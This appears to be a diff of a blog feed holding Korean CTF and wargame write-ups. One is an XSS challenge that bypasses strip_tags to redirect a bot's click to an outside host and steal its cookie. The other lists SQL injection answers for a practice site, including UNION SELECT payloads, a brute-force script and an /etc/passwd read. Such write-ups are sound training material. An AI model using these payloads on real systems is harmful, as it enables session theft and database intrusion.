($&#123;url&#125;)`)&#125;;</code></pre><p>문제에 보면 게시글을 올릴 수 있는 기능이 있다.</p><p>그리고 worker.js 파일을 보면 봇이 쿠키를 가지고 있음을 알 수 있다.</p><p>그럼 두가지를 요약해서 보면 봇이 내 게시글을 읽어서 봇의 쿠키를 빼돌려야 한다.</p><pre><code class="html">&lt;section&gt;  &lt;div class=&quot;container&quot;&gt;    &lt;h1 class=&quot;mt-4&quot;&gt;      &lt;?php if ($post[&#39;published&#39;] === &#39;0&#39;) &#123; ?&gt;&lt;span class=&quot;badge badge-secondary&quot;&gt;Secret&lt;/span&gt;&lt;?php &#125; ?&gt;      &lt;?= $post[&#39;title&#39;] ?&gt;    &lt;/h1&gt;    &lt;span class=&quot;text-muted&quot;&gt;by &lt;?= $post[&#39;username&#39;] ?&gt; &lt;span class=&quot;badge badge-love badge-pill&quot;&gt;♥ &lt;?= $post[&#39;likes&#39;] ?&gt;&lt;/span&gt;&lt;/span&gt;    &lt;div class=&quot;mt-3&quot;&gt;      &lt;?= render_tags($post[&#39;content&#39;]) ?&gt;    &lt;/div&gt;    &lt;div class=&quot;mt-3&quot;&gt;      &lt;a href=&quot;like.php?id=&lt;?= $post[&#39;id&#39;] ?&gt;&quot; id=&quot;like&quot; class=&quot;btn btn-love&quot;&gt;♥ Like this post&lt;/a&gt;    &lt;/div&gt;  &lt;/div&gt;&lt;/section&gt;</code></pre><p>게시글을 올리면 제목, 내용 그리고 like(좋아요?) 같은 버튼이 만들어 진다.</p><p>로직을 보면 봇이 like 버튼을 눌러주고 도망가는 구조이기 때문에 이 like 버튼을 누를 때</p><p>리다이렉션을 시켜서 서버로 플래그가 날아오게 하면 될 것 같다.</p><pre><code class="js">function render_tags($str) &#123;  $str = preg_replace(&#39;/\[\[(.+?)\]\]/&#39;, &#39;&lt;audio controls src=&quot;\\1&quot;&gt;&lt;/audio&gt;&#39;, $str);  $str = strip_tags($str, &#39;&lt;audio&gt;&#39;); // only allows `&lt;audio&gt;`  return $str;&#125;</code></pre><p>하지만 입력값 필터링이 걸려 있다.</p><p>그런데 strip_tags 함수를 사용하는데 이 함수에서 /(slash) 를 사용하면</p><p>audio -&gt; a/udio -&gt; a 태그로 만들어 낼 수 있다.</p><p>즉, 태그를 만들어 주고 like 클릭 이벤트를 다른 서버로 돌려서 플래그를 탈취하면 된다.</p><pre><code class="html">&lt;a/udio href=&#39;myip.kr:12345&#39; id=&#39;like&#39;&gt;like</code></pre>]]></content>
+        <content type="html"><![CDATA[<p>Site : <a href="https://www.zixem.altervista.org/SQLi/">https://www.zixem.altervista.org/SQLi/</a></p><hr><h3 id="1-LEVEL-1"><a href="#1-LEVEL-1" class="headerlink" title="1. LEVEL-1"></a>1. LEVEL-1</h3><pre><code class="sql">id=0%20union%20select%201,version(),3;--%20-</code></pre><hr><h3 id="2-LEVEL-2"><a href="#2-LEVEL-2" class="headerlink" title="2. LEVEL-2"></a>2. LEVEL-2</h3><pre><code class="sql">showprofile=0%27%20union%20select%201,2,version(),4;--%20-</code></pre><hr><h3 id="3-LEVEL-3"><a href="#3-LEVEL-3" class="headerlink" title="3. LEVEL-3"></a>3. LEVEL-3</h3><pre><code class="sql">item=0%27%20unionon%20select%201,2,version(),4;--%20-</code></pre><hr><h3 id="4-LEVEL-4"><a href="#4-LEVEL-4" class="headerlink" title="4. LEVEL-4"></a>4. LEVEL-4</h3><pre><code class="sql">ebookid=0%27%20union%20select%201,2,3,version(),5;--%20-</code></pre><hr><h3 id="5-LEVEL-5"><a href="#5-LEVEL-5" class="headerlink" title="5. LEVEL-5"></a>5. LEVEL-5</h3><pre><code class="py">#!/usr/bin/pythonimport requestsfor i in range(0,2000):param = &quot;http://www.zixem.altervista.org/SQLi/login_do.php?pass=&quot;+str(i)r = requests.get(param)print paramif &quot;Brute Force&quot; in r.text:    print &quot;found key: &quot; + str(i)    break</code></pre><hr><h3 id="6-LEVEL-6"><a href="#6-LEVEL-6" class="headerlink" title="6. LEVEL-6"></a>6. LEVEL-6</h3><pre><code class="sql">serial=0%20and%201=1%20union%20select%20id,teacher,teacher_age,price%20from%20teachers%20%20where%20id=11%23</code></pre><hr><h3 id="7-LEVEL-7"><a href="#7-LEVEL-7" class="headerlink" title="7. LEVEL-7"></a>7. LEVEL-7</h3><pre><code class="sql">id=0%20union%20select%201,version(),3;--%20-</code></pre><hr><h3 id="8-LEVEL-8"><a href="#8-LEVEL-8" class="headerlink" title="8. LEVEL-8"></a>8. LEVEL-8</h3><pre><code class="sql">id=0%09union%09seselectlect%091,version(),3;--%09-</code></pre><hr><h3 id="9-LEVEL-9"><a href="#9-LEVEL-9" class="headerlink" title="9. LEVEL-9"></a>9. LEVEL-9</h3><pre><code class="sql">0%27%20union%20select%20&quot;../etc/passwd&quot;,2;--%20-</code></pre><hr><h3 id="10-LEVEL-10"><a href="#10-LEVEL-10" class="headerlink" title="10. LEVEL-10"></a>10. LEVEL-10</h3><ul><li>php uuencode -&gt; base64 encode</li></ul><p>x=PywiIVU7RkVPO0IhUzk2UUU4VzBALDJRVjk3KVM6Nl1OKiJEWysyVEArMGBgCmAK</p><hr><h3 id="ALL-CLEAR"><a href="#ALL-CLEAR" class="headerlink" title="ALL CLEAR"></a>ALL CLEAR</h3>]]></content>
       
       
       <categories>
           
-          <category> CTF </category>
+          <category> Wargame </category>
           
       </categories>
       
